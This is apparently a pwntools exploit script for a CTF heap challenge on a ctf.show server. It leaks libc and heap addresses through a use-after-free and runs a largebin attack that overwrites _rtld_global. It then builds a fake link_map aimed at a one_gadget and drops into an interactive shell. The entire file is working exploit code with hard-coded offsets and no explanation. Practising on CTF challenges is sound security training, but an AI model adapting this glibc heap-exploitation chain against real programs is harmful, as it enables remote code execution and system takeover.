from pwn import *

context(arch='amd64', os='linux', log_level='debug')
# io = process('./pwn03')
io = remote('pwn.challenge.ctf.show', 28258)
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(index,size):
        io.sendlineafter('¥¥¥¥¥¥', str(1))
        io.sendlineafter('index:\n', str(index))
        io.sendlineafter("Size:\n", str(size))

def show(index):
        io.sendlineafter('¥¥¥¥¥¥', str(2))
        io.sendlineafter('index:\n', str(index))

def edit(index, content):
        io.sendlineafter('¥¥¥¥¥¥', str(3))
        io.sendlineafter('index:\n', str(index))
        io.sendafter("context: \n",content)

def delete(index):
        io.sendlineafter('¥¥¥¥¥¥', str(4))
        io.sendlineafter('index:\n', str(index))

add(0,0x428)
add(1,0x500)
add(2,0x418)
delete(0)
add(3,0x500)

show(0)
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x3ec090
edit(0,'b'*0x10)
show(0)
io.recvuntil('b'*0x10)
heap_base = u64(io.recv(6).ljust(8,b'\x00'))-0x250

rtld_global = libc_base + 0x61b060
one_gadget = libc_base + 0x4f302
delete(2)
edit(0,p64(libc_base + 0x3ec090)*2+p64(heap_base+0x250)+p64(rtld_global-0x20))
add(4,0x500)

link_map=p64(0)*1
link_map+=p64(libc_base+0x61c710)
link_map+=p64(0)
link_map+=p64(heap_base+0xb90)
link_map+=p64(0)*28 
link_map+=p64(heap_base+0xc08+0x98)
link_map+=p64(heap_base+0xc08+32+0x98)
link_map+=p64(heap_base+0xc08+0x10+0x98)
link_map+=p64(8)
link_map+=p64(one_gadget)
link_map+=p64(heap_base+0xb90)
link_map+=p64(0)*58
link_map+=p64(0x800000000)

edit(2,link_map)
io.sendlineafter('¥¥¥¥¥¥', str(5))

io.interactive()